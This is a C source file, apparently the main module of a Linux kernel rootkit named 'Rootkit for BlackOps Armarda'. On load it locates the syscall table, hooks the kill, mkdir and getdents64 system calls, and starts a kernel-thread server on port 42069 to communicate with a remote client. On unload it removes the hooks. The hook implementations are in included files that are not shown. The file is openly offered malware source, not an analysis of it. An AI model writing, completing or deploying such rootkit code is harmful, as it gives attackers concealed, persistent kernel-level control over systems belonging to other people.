/*=================*\
kernel module imports
\*=================*/
#include <linux/init.h> //macros used to mark up functions   e.g. __init __exit
#include <linux/module.h> // core header for loading module into kernel
#include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO
#include <linux/string.h>

static int BUFFER_SIZE = 2048; //size of buffers used
static char ROOTKIT_ID[] =  "Rootkit198760"; //id of the rootkit


#include "custom/log.c" //functions for file I/O and for
#include "custom/server.c" //functions to run server and communicate with client
#include "custom/syscall_table.c" //functions for getting sycall syscall_table
#include "custom/hooks.c" //functions for hooking syscalls
#include "custom/hooked_syscalls.c" //functions of the hooked syscalls

static void __exit ModuleExit(void) {
	remove_hook(&sys_kill); //removes sys_kill hook
	remove_hook(&sys_mkdir); //removes sys_mkdir hook
	//remove_hook(&sys_execve); //removes sys_execve hook
	remove_hook(&sys_getdents64); //removes sys_getdents64 hook
	log("[rootkit] module removed!!!\n");
	remove_server();
	close_logging();
	printk(KERN_DEBUG "[rootkit] removed\n"); //DEBUG
}

static int __init ModuleInit(void) {
	init_logging(); //enables logging abiltiy
	printk(KERN_DEBUG "[rootkit] installed- ID=%s\n", ROOTKIT_ID); //DEBUG //DEBUG logs to dmesg
	get_syscall_table(); //gets suyscall table
	install_hook(&sys_kill); //installs sys_kill hook
	install_hook(&sys_mkdir); //installs sys_mkdir hook
	//install_hook(&sys_execve); //installs sys_execve hook
	install_hook(&sys_getdents64); //removes sys_getdents64 hook
	unsigned short int port = 42069; //sets the port to set
	kthread_run(run_server, (void *) port, "server"); //runs the server
	return 0;
}


module_init(ModuleInit);
module_exit(ModuleExit);
MODULE_AUTHOR("Artemis's Angel"); //author
MODULE_DESCRIPTION("Rootkit for BlackOps Armarda"); //description
MODULE_LICENSE("GPL");// GPL license
MODULE_VERSION("1.07"); //version
